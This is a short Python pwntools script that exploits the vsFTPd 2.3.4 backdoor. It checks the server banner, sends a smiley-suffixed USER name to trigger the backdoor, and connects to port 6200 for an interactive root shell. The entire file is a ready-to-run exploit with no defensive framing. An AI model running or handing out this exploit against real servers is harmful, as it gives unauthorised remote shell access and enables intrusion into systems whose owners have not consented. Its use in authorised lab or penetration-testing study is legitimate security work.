#!/usr/bin/python3

from pwn import *
from sys import exit
from time import sleep

class FTPExploit:
    def __init__(self, target_ip, target_port=21):
        self.target_ip = target_ip
        self.target_port = target_port
        self.progress = log.progress("Initializing...")

    def verify_version(self):
        self.progress.status("Checking FTP version...")
        connection = remote(self.target_ip, self.target_port)
        connection.recvuntil(b"vsFTPd ")
        version = connection.recvuntil(b")")[:-1].decode()
        if version != "2.3.4":
            self.progress.failure("Version 2.3.4 not found!")
            exit()
        return connection

    def trigger_exploit(self, connection):
        self.progress.status("Attempting to trigger backdoor...")
        connection.sendline(b"USER hello:)")
        connection.sendline(b"PASS hello123")
        connection.close()

    def connect_backdoor(self):
        self.progress.status("Waiting for backdoor to open...")
        sleep(1)
        connection = remote(self.target_ip, 6200)
        self.progress.success("Backdoor connected! Shell acquired.")
        connection.interactive()
        connection.close()

def main():
    if len(sys.argv) < 2 or len(sys.argv) > 3:
        error(f"Usage: {sys.argv[0]} IP [PORT]")

    ip = sys.argv[1]
    port = sys.argv[2] if len(sys.argv) == 3 else 21

    exploit = FTPExploit(ip, port)

    # Step 1: Verify version
    connection = exploit.verify_version()

    # Step 2: Trigger the backdoor
    exploit.trigger_exploit(connection)

    # Step 3: Connect to the backdoor shell
    exploit.connect_backdoor()

if __name__ == "__main__":
    main()
